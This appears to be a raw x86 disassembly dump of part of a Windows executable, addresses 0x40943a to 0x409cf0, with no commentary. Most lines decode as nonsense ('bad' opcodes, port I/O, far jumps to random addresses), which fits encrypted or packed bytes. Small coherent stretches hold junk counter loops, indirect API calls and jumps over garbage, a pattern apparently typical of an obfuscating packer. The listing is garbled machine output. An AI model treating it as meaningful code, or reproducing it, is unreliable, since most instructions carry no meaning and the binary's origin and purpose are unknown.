  40943a:	retf   
  40943b:	ss xchg ebx,eax
  40943d:	sbb    eax,0x3c3b0b38
  409442:	xchg   esp,eax
  409443:	int    0x19
  409445:	add    DWORD PTR [edx],edx
  409447:	lea    esp,[ebx+0x47]
  40944a:	popa   
  40944b:	xchg   BYTE PTR [ebx],al
  40944d:	fsubr  DWORD PTR [edi]
  40944f:	lock dec esp
  409451:	cli    
  409452:	or     bh,bh
  409454:	arpl   WORD PTR ds:0xc700fcea,si
  40945a:	lds    edi,FWORD PTR [edx*2+0x6784b18e]
  409461:	or     bl,ch
  409463:	lds    esi,FWORD PTR [esi]
  409465:	xor    dh,BYTE PTR [esp+ebp*4-0x4402dd09]
  40946c:	xor    edi,eax
  40946e:	retf   
  40946f:	pop    edi
  409470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409471:	pushf  
  409472:	ins    BYTE PTR es:[edi],dx
  409473:	mov    cl,0xc7
  409475:	inc    ebp
  409476:	in     al,dx
  409477:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40947d:	sub    edi,DWORD PTR [eax]
  40947f:	inc    ebx
  409480:	add    BYTE PTR [eax],al
  409482:	add    BYTE PTR [eax],al
  409484:	add    BYTE PTR [ebx],dh
  409486:	leave  
  409487:	add    ecx,DWORD PTR ds:0x43382b
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x43382b,ecx
  409494:	cmp    DWORD PTR ds:0x43382b,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x43382b,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433713,ecx
  4094d2:	lea    eax,[ebp-0x14]
  4094d5:	and    DWORD PTR ds:0x433777,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x433777
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x433777,ebx
  4094f1:	cmp    DWORD PTR ds:0x433777,0x13
  4094f8:	jae    0x40951b
  4094fe:	cmp    DWORD PTR ds:0x433777,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
  40951e:	and    DWORD PTR ds:0x43377b,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x43377b
  409532:	inc    eax
  409533:	mov    ds:0x43377b,eax
  409538:	cmp    DWORD PTR ds:0x43377b,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x43377b,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x43377b,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x43377b
  40956d:	inc    eax
  40956e:	mov    ds:0x43377b,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x4337b7,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x433723,0x433713
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x433733,0x43382f
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
  4095cd:	ds sbb eax,0xc60d70b
  4095d3:	pop    esi
  4095d4:	ins    BYTE PTR es:[edi],dx
  4095d5:	fnstcw WORD PTR [esi+0x7e]
  4095d8:	jp     0x409657
  4095da:	jle    0x40965a
  4095dc:	pop    esp
  4095dd:	jmp    0x4095d9
  4095df:	jecxz  0x4095c0
  4095e1:	xchg   ebx,eax
  4095e2:	jl     0x4095ad
  4095e4:	mov    BYTE PTR [esi-0x64],ch
  4095e7:	push   ebp
  4095e8:	lds    eax,FWORD PTR [esi+0x49]
  4095eb:	and    eax,0x54c3a865
  4095f0:	cmc    
  4095f1:	mov    DWORD PTR [esp+ebx*1],edi
  4095f4:	adc    dl,BYTE PTR [ebx-0xa]
  4095f7:	lahf   
  4095f8:	hlt    
  4095f9:	(bad)  
  4095fa:	outs   dx,DWORD PTR ds:[esi]
  4095fb:	add    al,0x48
  4095fd:	or     edx,ebx
  4095ff:	call   FWORD PTR ds:0x5a0756f2
  409605:	dec    bl
  409607:	popf   
  409608:	cwde   
  409609:	inc    esp
  40960a:	icebp  
  40960b:	in     eax,0x24
  40960d:	in     al,dx
  40960e:	mov    ebx,DWORD PTR [ecx+0x6c3eeb04]
  409614:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409615:	ds retf 0x4fb
  409619:	adc    ch,ch
  40961b:	retf   
  40961c:	or     ch,BYTE PTR [esi-0x69]
  40961f:	push   esi
  409620:	inc    DWORD PTR [edx+0x67]
  409623:	iret   
  409624:	cmp    eax,0x81eb9fd4
  409629:	rcl    DWORD PTR [esp+edi*1],1
  40962c:	sbb    eax,0x9930ea64
  409631:	mov    ds:0x45410aa8,eax
  409636:	mov    edi,0x6075629c
  40963b:	lock jb 0x409689
  40963e:	fs and eax,0x44c8384d
  409644:	inc    ebx
  409645:	data16 add BYTE PTR fs:[esi+ebx*4-0x70],cl
  40964b:	daa    
  40964c:	or     esi,ecx
  40964e:	inc    ecx
  40964f:	add    ecx,DWORD PTR [ecx]
  409651:	daa    
  409652:	loopne 0x4096a2
  409654:	jp     0x409692
  409656:	or     eax,0x324296c8
  40965b:	add    DWORD PTR [esp+ebp*8+0x43],0x9549c29b
  409663:	xchg   esp,eax
  409664:	xor    al,BYTE PTR ds:0xc0d25d4c
  40966a:	ror    ecx,0x37
  40966d:	or     eax,0x7ba521d0
  409672:	jae    0x4095f5
  409674:	dec    eax
  409675:	dec    esp
  409676:	sub    al,0xa6
  409678:	xchg   DWORD PTR es:[eax+ecx*8],esi
  40967c:	and    ah,BYTE PTR [ebp-0x68c9b005]
  409682:	inc    edi
  409683:	test   BYTE PTR [ebp-0x72],0x30
  409687:	lods   eax,DWORD PTR ds:[esi]
  409688:	sti    
  409689:	shl    ah,1
  40968b:	ss jb  0x4096b6
  40968e:	push   0x6fcd7299
  409693:	in     eax,dx
  409694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409695:	adc    al,cl
  409697:	dec    ebp
  409698:	push   edx
  409699:	inc    esi
  40969a:	sti    
  40969b:	(bad)  
  40969c:	popf   
  40969d:	loope  0x409641
  40969f:	pop    eax
  4096a0:	cs pop es
  4096a2:	adc    BYTE PTR [esi],bl
  4096a4:	bswap  sp
  4096a7:	fimul  WORD PTR [esi]
  4096a9:	call   0x2d31f050
  4096ae:	aad    0x72
  4096b0:	dec    ebx
  4096b1:	xchg   DWORD PTR [eax-0x586ea99c],esi
  4096b7:	in     al,dx
  4096b8:	stos   BYTE PTR es:[edi],al
  4096b9:	test   eax,0xa1629a48
  4096be:	jbe    0x4096bd
  4096c0:	loope  0x409652
  4096c2:	out    dx,eax
  4096c3:	ins    BYTE PTR es:[edi],dx
  4096c4:	out    0xa3,eax
  4096c6:	sahf   
  4096c7:	inc    ebp
  4096c8:	sbb    al,0x47
  4096ca:	test   BYTE PTR [eax+eax*8],0x81
  4096ce:	std    
  4096cf:	add    al,cl
  4096d1:	and    esi,0x8e22b77b
  4096d7:	lahf   
  4096d8:	pusha  
  4096d9:	adc    edi,DWORD PTR [edi-0x1a315535]
  4096df:	clc    
  4096e0:	jo     0x40975f
  4096e2:	inc    edi
  4096e3:	xor    bl,ch
  4096e5:	inc    esi
  4096e6:	aas    
  4096e7:	sahf   
  4096e8:	mov    ebp,0xfbb30048
  4096ed:	jae    0x40974d
  4096ef:	mov    eax,0x7e06438c
  4096f4:	rol    DWORD PTR [edx+0x77fe880],0x3a
  4096fb:	push   esi
  4096fc:	push   ss
  4096fd:	push   esi
  4096fe:	mov    cl,0x98
  409700:	dec    eax
  409701:	inc    eax
  409702:	stos   DWORD PTR es:[edi],eax
  409703:	(bad)  
  409705:	dec    ebx
  409706:	add    bh,ch
  409708:	push   ebp
  409709:	mov    al,dh
  40970b:	adc    al,ch
  40970d:	add    eax,0x8210c596
  409712:	gs pop ebp
  409714:	not    ah
  409716:	pop    esp
  409717:	cs aam 0x18
  40971a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40971b:	cli    
  40971c:	push   0x88f8b252
  409721:	or     al,0x3b
  409723:	add    cl,BYTE PTR [eax-0x3]
  409726:	or     ah,bl
  409728:	aaa    
  409729:	test   al,0xfa
  40972b:	sub    al,0xda
  40972d:	push   ebx
  40972e:	and    esi,DWORD PTR [ecx-0x26c49b5f]
  409734:	jp     0x409705
  409736:	mov    dl,0x16
  409738:	push   cs
  409739:	fadd   st(6),st
  40973b:	and    BYTE PTR [edi+0x5964a489],0x73
  409742:	adc    eax,0x96c5c474
  409747:	js     0x409744
  409749:	or     ah,BYTE PTR [ebp-0x172f8be2]
  40974f:	ror    DWORD PTR [edi+0x6c3c6982],0x90
  409756:	dec    esi
  409757:	adc    BYTE PTR [eax],dl
  409759:	inc    edx
  40975a:	add    bh,BYTE PTR [edx+ecx*2]
  40975d:	push   esp
  40975e:	push   esp
  40975f:	jmp    0x26aeac25
  409764:	stos   BYTE PTR es:[edi],al
  409765:	mov    ah,0x43
  409767:	enter  0x1f63,0x87
  40976b:	js     0x4097bc
  40976d:	nop
  40976e:	sub    eax,0xf09aeace
  409773:	repz pushf 
  409775:	pop    edx
  409776:	or     BYTE PTR [edx-0x9],cl
  409779:	retf   
  40977a:	mov    WORD PTR [edi+0x31070c47],ss
  409780:	add    DWORD PTR [ebx+0x175304de],ebp
  409786:	and    al,0x35
  409788:	dec    edi
  409789:	mov    ch,bl
  40978b:	or     al,0x7d
  40978d:	mov    cl,0x5c
  40978f:	pop    edx
  409790:	popf   
  409791:	fcmovbe st,st(7)
  409793:	inc    edi
  409794:	(bad)  
  409796:	aam    0x46
  409798:	cmp    DWORD PTR [eax-0x34],esp
  40979b:	scas   eax,DWORD PTR es:[edi]
  40979c:	pop    ebp
  40979d:	cwde   
  40979e:	add    al,BYTE PTR [ecx-0x6c]
  4097a1:	bound  edx,QWORD PTR [edx+0x67]
  4097a4:	add    ebx,esi
  4097a6:	xlat   BYTE PTR ds:[ebx]
  4097a7:	mov    dl,0x89
  4097a9:	jge    0x4097bb
  4097ab:	(bad)  [esi+0x6d]
  4097ae:	inc    DWORD PTR [eax]
  4097b0:	mov    bl,0x24
  4097b2:	int    0xb2
  4097b4:	xor    bh,bh
  4097b6:	mov    ?,WORD PTR [ebx]
  4097b8:	ret    0xe9e4
  4097bb:	pop    ebx
  4097bc:	or     dh,BYTE PTR [ecx-0x7ae70689]
  4097c2:	push   0x9236b472
  4097c7:	or     al,0xb0
  4097c9:	and    BYTE PTR [ebx+0x2510308],0x98
  4097d0:	test   al,0xec
  4097d2:	popf   
  4097d3:	add    bl,dh
  4097d5:	push   ebp
  4097d6:	shl    DWORD PTR [ebx-0x2a14c34e],cl
  4097dc:	or     ebp,DWORD PTR [ebp+0x36cf47ce]
  4097e2:	lea    edx,[eax-0x16]
  4097e5:	and    DWORD PTR [edx+0x285b6d67],esp
  4097eb:	xor    DWORD PTR [edi+0x2f],ecx
  4097ee:	imul   ebp,DWORD PTR [ecx+0x4d],0xfffffff3
  4097f2:	in     al,0xca
  4097f4:	cmp    bh,dl
  4097f6:	ret    0xd49f
  4097f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097fa:	bnd call 0x86ccf1ae
  409800:	icebp  
  409801:	mov    edi,0x660e7238
  409806:	xchg   edx,eax
  409807:	mov    ch,BYTE PTR [esi+0x3f]
  40980a:	cmc    
  40980b:	addr16 jmp 0x6ed3:0xe848e107
  409813:	add    eax,0x31bf1256
  409818:	clc    
  409819:	pop    eax
  40981a:	push   eax
  40981b:	xor    BYTE PTR [esi+ecx*1],0xd1
  40981f:	rcl    DWORD PTR ds:0xfe24cbbc,1
  409825:	mov    cl,0xbf
  409827:	push   0x44
  409829:	jle    0x4097e0
  40982b:	gs mov ebx,eax
  40982e:	jns    0x4097d5
  409830:	gs scas eax,DWORD PTR es:[edi]
  409832:	(bad)  
  409833:	mov    bl,0x31
  409835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409836:	sub    BYTE PTR [ebx],0xc4
  409839:	jl     0x409892
  40983b:	sub    eax,0xef92f21e
  409840:	pop    ss
  409841:	dec    ebx
  409842:	mov    bl,0x48
  409844:	sahf   
  409845:	push   0x3c
  409847:	cli    
  409848:	push   es
  409849:	cs mov dl,0xea
  40984c:	or     dh,BYTE PTR [edx-0xbf02c5f]
  409852:	jmp    0x409877
  409854:	push   0xcfe3b7c3
  409859:	nop
  40985a:	(bad)  [edx-0x6f]
  40985d:	out    dx,al
  40985e:	(bad)  
  40985f:	test   al,0x8f
  409861:	retw   0xb5d5
  409865:	imul   esi,ebp,0x54823328
  40986b:	sbb    BYTE PTR [ecx+0x6c],cl
  40986e:	out    dx,eax
  40986f:	or     BYTE PTR [eax+0x2f],dl
  409872:	in     al,0xf8
  409874:	jecxz  0x40984e
  409876:	into   
  409877:	iret   
  409878:	jl     0x4098b9
  40987a:	xor    eax,0x64ebfe47
  40987f:	fisub  DWORD PTR [edx+0x47036db1]
  409885:	dec    esp
  409886:	jle    0x409893
  409888:	gs leave 
  40988a:	mov    ?,esi
  40988c:	xor    ecx,ecx
  40988e:	sbb    BYTE PTR [eax],0x3f
  409891:	cmp    eax,0x15093595
  409896:	cmp    al,0x4d
  409898:	ins    BYTE PTR es:[edi],dx
  409899:	jl     0x409887
  40989b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40989c:	adc    esi,esi
  40989e:	push   cs
  40989f:	push   edi
  4098a0:	ret    0xd1ca
  4098a3:	rcr    BYTE PTR [edi],1
  4098a5:	test   DWORD PTR [eax],ebx
  4098a7:	jecxz  0x40986a
  4098a9:	mov    edi,0xc20a0b23
  4098ae:	mov    dl,0xe3
  4098b0:	and    al,0xec
  4098b2:	sub    edx,DWORD PTR [esi]
  4098b4:	sub    DWORD PTR [ebx+0x37],ebp
  4098b7:	or     al,0x56
  4098b9:	jg     0x40985d
  4098bb:	pop    eax
  4098bc:	jmp    0x409917
  4098be:	aaa    
  4098bf:	xchg   edi,eax
  4098c0:	rcl    bl,1
  4098c2:	xchg   esp,eax
  4098c3:	xor    al,0xe6
  4098c5:	cli    
  4098c6:	jno    0x409914
  4098c8:	xor    eax,0x9d44275f
  4098cd:	dec    esp
  4098ce:	ret    
  4098cf:	pop    ds
  4098d0:	js     0x40989e
  4098d2:	jge    0x4098a3
  4098d4:	jle    0x409915
  4098d6:	and    al,0x9b
  4098d8:	xchg   BYTE PTR [edx-0x66],ch
  4098db:	and    al,0xa9
  4098de:	(bad)  
  4098e0:	movzx  ecx,cx
  4098e3:	sbb    DWORD PTR ds:0x43383b,0x5a23
  4098ed:	add    ecx,DWORD PTR [eax]
  4098ef:	adc    DWORD PTR ds:0x4337a7,ebx
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x433737
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x43376f,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x43376f
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x43376f,ecx
  409918:	cmp    DWORD PTR ds:0x43376f,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x43376f,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x4337a7,0x11
  40994a:	cmp    DWORD PTR ds:0x4337a7,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x4337a7,0x6
  40995e:	jne    0x409977
  409964:	push   0x4338a4
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x4337a7,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x4337a7
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x4337a7,ecx
  409991:	mov    ecx,DWORD PTR ds:0x4337a7
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x4337a7,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	frstor [eax]
  4099be:	mov    al,0xfc
  4099c0:	bound  ebp,QWORD PTR [eax-0x1c]
  4099c3:	jle    0x409a43
  4099c5:	jp     0x409a44
  4099c7:	jle    0x409a47
  4099c9:	fadd   QWORD PTR [eax+0x5ca40df2]
  4099cf:	repz jno 0x4099e1
  4099d2:	jle    0x409968
  4099d4:	das    
  4099d5:	aam    0xf6
  4099d7:	add    bh,dh
  4099d9:	lea    ebp,[ebp-0x4ffb96cf]
  4099df:	jecxz  0x4099df
  4099e1:	mov    ebx,0x5d86cc9f
  4099e6:	mov    ebp,0x3d3bf90f
  4099eb:	push   edx
  4099ec:	ret    
  4099ed:	push   0xa2d5c349
  4099f2:	cmp    eax,0x8adf80fc
  4099f7:	arpl   WORD PTR [ebx+0x614cfc36],ax
  4099fd:	clc    
  4099fe:	ins    BYTE PTR es:[edi],dx
  4099ff:	stos   BYTE PTR es:[edi],al
  409a00:	pop    ds
  409a01:	xchg   ebp,eax
  409a02:	jns    0x4099a5
  409a04:	jno    0x4099ea
  409a06:	xchg   BYTE PTR [edi],bh
  409a08:	jmp    0xc4bc185f
  409a0d:	xchg   ebx,eax
  409a0e:	jl     0x4099e8
  409a10:	nop
  409a11:	ror    DWORD PTR [eax],cl
  409a13:	dec    edi
  409a14:	mov    bl,0xf3
  409a16:	arpl   WORD PTR [edi+ebp*8-0xc8f4bc3],si
  409a1d:	push   0xffffffca
  409a1f:	sub    DWORD PTR [esi+0x11],0xf149ab6e
  409a26:	xchg   ebp,eax
  409a27:	ins    DWORD PTR es:[edi],dx
  409a28:	inc    esi
  409a29:	mov    ah,0xe7
  409a2b:	fild   DWORD PTR [eax+0x40]
  409a2e:	push   cs
  409a2f:	and    eax,0x508f12cb
  409a34:	lds    ecx,FWORD PTR [ebx+0x46]
  409a37:	(bad)  
  409a38:	push   esi
  409a39:	push   esi
  409a3a:	setbe  BYTE PTR [ecx+0x7418aee6]
  409a41:	xor    eax,0x91bb6c7a
  409a46:	(bad)  
  409a47:	cs push eax
  409a49:	arpl   bx,bp
  409a4b:	sub    edx,DWORD PTR [esi+0x2913dacb]
  409a51:	test   al,0x66
  409a53:	(bad)
  409a56:	fwait
  409a57:	std    
  409a58:	jle    0x409a2a
  409a5a:	mov    edi,0x43aba0e8
  409a5f:	xor    eax,0x22c1e8c5
  409a64:	or     BYTE PTR gs:[eax-0x55],bh
  409a68:	mov    eax,0x6b6b442b
  409a6d:	iret   
  409a6e:	pusha  
  409a6f:	pushf  
  409a70:	aaa    
  409a71:	nop
  409a72:	(bad)  
  409a74:	pop    esi
  409a75:	xchg   ebp,eax
  409a76:	cli    
  409a77:	aad    0x0
  409a79:	adc    al,0xa8
  409a7b:	fisttp QWORD PTR [esi-0x1c]
  409a7e:	jmp    0x4f35:0x8653a208
  409a85:	(bad)  [edx+0x32]
  409a88:	outs   dx,BYTE PTR ds:[esi]
  409a89:	pop    ecx
  409a8a:	test   eax,0x893f720
  409a8f:	jno    0x409aac
  409a91:	outs   dx,BYTE PTR ds:[esi]
  409a92:	(bad)  
  409a93:	shl    ecx,cl
  409a95:	dec    edx
  409a96:	div    BYTE PTR [esp+esi*4]
  409a99:	dec    edi
  409a9a:	inc    ecx
  409a9b:	shl    edi,0x6d
  409a9e:	in     al,dx
  409a9f:	mov    ds:0xa519445,eax
  409aa4:	dec    ebx
  409aa5:	pop    esi
  409aa6:	test   eax,0x101424f1
  409aab:	aaa    
  409aac:	loop   0x409ac1
  409aae:	jp     0x409ad9
  409ab0:	cmp    edx,ebp
  409ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ab3:	add    BYTE PTR [ecx+ecx*2-0x13],ch
  409ab7:	inc    ecx
  409ab8:	or     DWORD PTR [eax+0x33a78d72],ebx
  409abe:	push   0xe5909978
  409ac3:	inc    edi
  409ac4:	inc    ebp
  409ac5:	lea    edi,[edi+ebx*8]
  409ac8:	sbb    eax,0x6336801f
  409acd:	and    eax,0x77de21d7
  409ad2:	xchg   esi,eax
  409ad3:	imul   edx,DWORD PTR [ebp+edi*4+0x1d95fbb9],0x369b3df9
  409ade:	fs push ds
  409ae0:	addr16 out 0x10,al
  409ae3:	outs   dx,BYTE PTR ds:[esi]
  409ae4:	(bad)  
  409ae5:	jmp    0x9ce0:0x23be4b16
  409aec:	sti    
  409aed:	gs cmp al,0xc2
  409af0:	push   ebp
  409af1:	and    DWORD PTR [edx+0x27d87c9e],esi
  409af7:	and    al,0xf7
  409af9:	push   ecx
  409afa:	ror    BYTE PTR [ecx-0x73],cl
  409afd:	adc    bh,bh
  409aff:	pop    esp
  409b00:	inc    esp
  409b01:	loopne 0x409b2a
  409b03:	and    esp,ebp
  409b05:	sar    DWORD PTR [edi],cl
  409b07:	loopne 0x409b80
  409b09:	pop    ss
  409b0a:	hlt    
  409b0b:	dec    eax
  409b0c:	cdq    
  409b0d:	test   DWORD PTR [ebx-0x6c],eax
  409b10:	out    0x98,eax
  409b12:	fistp  QWORD PTR [edi]
  409b14:	nop
  409b15:	cmp    eax,0xaedc3ee
  409b1a:	jl     0x409b68
  409b1c:	mov    ds:0x90bb6bab,al
  409b21:	mov    esi,0x40affa
  409b26:	jecxz  0x409b43
  409b28:	fs jbe 0x409b83
  409b2b:	clc    
  409b2c:	push   ebx
  409b2d:	out    0x4f,al
  409b2f:	adc    cl,BYTE PTR ds:0x1a31eb7e
  409b35:	sub    ch,cl
  409b37:	(bad)  [eax-0x25fd80a]
  409b3d:	sub    cl,BYTE PTR [edi+0x847f655]
  409b43:	out    dx,eax
  409b44:	outs   dx,DWORD PTR ds:[esi]
  409b45:	pop    es
  409b46:	mov    ss,ebx
  409b48:	ja     0x409b87
  409b4a:	cmp    eax,0xa43d4a18
  409b4f:	adc    esp,DWORD PTR [ecx+0x76]
  409b52:	push   edi
  409b53:	jb     0x409b9c
  409b55:	inc    ecx
  409b56:	into   
  409b57:	les    ecx,FWORD PTR ds:0x3625d06f
  409b5d:	jle    0x409b2a
  409b5f:	jl     0x409b99
  409b61:	jb     0x409bd7
  409b63:	ficomp DWORD PTR [ebp+0x79]
  409b66:	push   esp
  409b67:	adc    al,0x1f
  409b69:	cli    
  409b6a:	sti    
  409b6b:	fld    TBYTE PTR [edx+eiz*2-0x24]
  409b6f:	test   DWORD PTR [ebp+0x49],esi
  409b72:	(bad)  
  409b73:	mov    bh,0x37
  409b75:	push   edi
  409b76:	(bad)  
  409b77:	(bad)  
  409b78:	push   edi
  409b79:	in     al,dx
  409b7a:	test   eax,0xa3fba95a
  409b7f:	fsubr  DWORD PTR [edi-0x3a]
  409b82:	xor    esi,esi
  409b84:	pop    esi
  409b85:	pushf  
  409b86:	add    esi,ebp
  409b88:	jnp    0x409bb7
  409b8a:	pop    ebp
  409b8b:	adc    dh,ah
  409b8d:	sub    ecx,DWORD PTR [ecx-0x2f0dd3ee]
  409b93:	push   cs
  409b94:	sbb    ebx,DWORD PTR [esi+0x3cc5434f]
  409b9a:	mov    eax,ds:0x3f71349a
  409b9f:	push   ebp
  409ba0:	stos   DWORD PTR es:[edi],eax
  409ba1:	outs   dx,BYTE PTR ds:[esi]
  409ba2:	fdivr  DWORD PTR [eax-0x37]
  409ba5:	dec    ecx
  409ba6:	loope  0x409ba2
  409ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ba9:	cmp    eax,0xf692f56b
  409bae:	xchg   ecx,eax
  409baf:	in     eax,dx
  409bb0:	mov    WORD PTR [ecx+0x70],?
  409bb3:	dec    esi
  409bb4:	imul   ebp,DWORD PTR [edi],0xc7bf357
  409bba:	push   ss
  409bbb:	(bad)  
  409bbc:	cmp    edi,DWORD PTR ds:0xb0177820
  409bc2:	int    0x19
  409bc4:	sub    cl,ch
  409bc6:	rcl    edx,1
  409bc8:	lea    ebx,[edi]
  409bca:	je     0x409bfc
  409bcc:	fsub   QWORD PTR [ebx-0x41029391]
  409bd2:	sub    al,0x9c
  409bd4:	inc    ecx
  409bd5:	repz les ebp,FWORD PTR [edi]
  409bd8:	fidiv  DWORD PTR [ebx]
  409bda:	in     eax,0x3d
  409bdc:	or     esp,DWORD PTR [edi]
  409bde:	dec    ebx
  409bdf:	retf   
  409be0:	xor    BYTE PTR [ebp-0x5d],cl
  409be3:	out    0x87,eax
  409be5:	xchg   edx,eax
  409be6:	pop    ds
  409be7:	mov    bh,0xe1
  409be9:	sbb    eax,0x151d6044
  409bee:	adc    BYTE PTR [eax+0x6b5824fd],al
  409bf4:	not    BYTE PTR [eax]
  409bf6:	mov    ebp,0x10cad32c
  409bfb:	out    dx,al
  409bfc:	arpl   WORD PTR [ebx],cx
  409bfe:	hlt    
  409bff:	inc    ebx
  409c00:	dec    ecx
  409c01:	push   ss
  409c02:	int    0x44
  409c04:	sub    edi,ecx
  409c06:	lahf   
  409c07:	not    BYTE PTR [edi-0x1cfe4bf3]
  409c0d:	pop    esi
  409c0e:	lock inc edi
  409c10:	pop    eax
  409c11:	ret    
  409c12:	enter  0x586b,0xd5
  409c16:	repnz fwait
  409c18:	sbb    al,0xbc
  409c1a:	sub    al,0xab
  409c1c:	ds ret 
  409c1e:	popf   
  409c1f:	inc    eax
  409c20:	and    al,0xfe
  409c22:	call   0x836e:0x87d2c624
  409c29:	push   0x78
  409c2b:	mov    BYTE PTR [ecx],cl
  409c2d:	pop    es
  409c2e:	xor    BYTE PTR [ecx-0x544f63b0],ch
  409c34:	or     ebp,DWORD PTR [edx-0x41]
  409c37:	mov    ebp,0x4ac5e139
  409c3c:	ins    BYTE PTR es:[edi],dx
  409c3d:	(bad)  
  409c3f:	fldcw  WORD PTR [ebx-0x54b608fa]
  409c45:	dec    edx
  409c46:	mov    bh,0xed
  409c48:	push   esi
  409c49:	sbb    bl,BYTE PTR [ecx+0x49]
  409c4c:	mov    eax,0xef769f89
  409c51:	mov    al,0x3
  409c53:	xchg   ecx,eax
  409c54:	popf   
  409c55:	push   eax
  409c56:	xor    cl,BYTE PTR [ecx]
  409c58:	sbb    BYTE PTR [ebx-0x5ad0b2c0],0xd2
  409c5f:	pop    ebp
  409c60:	and    eax,0xad1ac42d
  409c65:	add    dh,dl
  409c67:	push   ebx
  409c68:	(bad)  
  409c69:	in     al,0xf8
  409c6b:	push   ss
  409c6c:	fcomp  DWORD PTR [edx+0x1cca22fe]
  409c72:	and    al,0x46
  409c74:	dec    ebp
  409c75:	jmp    0x64d41046
  409c7a:	push   cs
  409c7b:	bndstx [ebp+0x4c],(bad)
  409c7f:	mov    cl,BYTE PTR [esp+eax*4+0x23]
  409c83:	out    dx,eax
  409c84:	or     al,0xa
  409c86:	out    0x65,eax
  409c88:	(bad)  
  409c8a:	in     eax,0x37
  409c8c:	mov    DWORD PTR [ebp-0x7f],edx
  409c8f:	ret    
  409c90:	mov    ds:0x48239bd7,eax
  409c95:	lock mov esi,0x2cd69b9e
  409c9b:	enter  0xaaaf,0xe8
  409c9f:	xchg   esi,eax
  409ca0:	jle    0x409d21
  409ca2:	xchg   esp,eax
  409ca3:	mov    edi,0xbf6d7631
  409ca8:	mov    esp,0x18cee9d6
  409cad:	mov    esp,0xd7ed5fdd
  409cb2:	xor    bl,dl
  409cb4:	and    ah,0xac
  409cb7:	add    DWORD PTR [edx+edx*4-0x573f2f0d],eax
  409cbe:	or     al,0xa4
  409cc0:	jo     0x409cc4
  409cc2:	inc    ecx
  409cc3:	dec    ebp
  409cc4:	push   edx
  409cc5:	sbb    dl,BYTE PTR [edx+eax*4-0x46c1f925]
  409ccc:	cmp    DWORD PTR [edi],ecx
  409cce:	test   esi,eax
  409cd0:	push   es
  409cd1:	add    BYTE PTR [eax],al
  409cd3:	mov    eax,DWORD PTR [ebp+0x8]
  409cd6:	mov    ecx,DWORD PTR [ebp-0x18]
  409cd9:	xor    eax,esi
  409cdb:	add    eax,edi
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
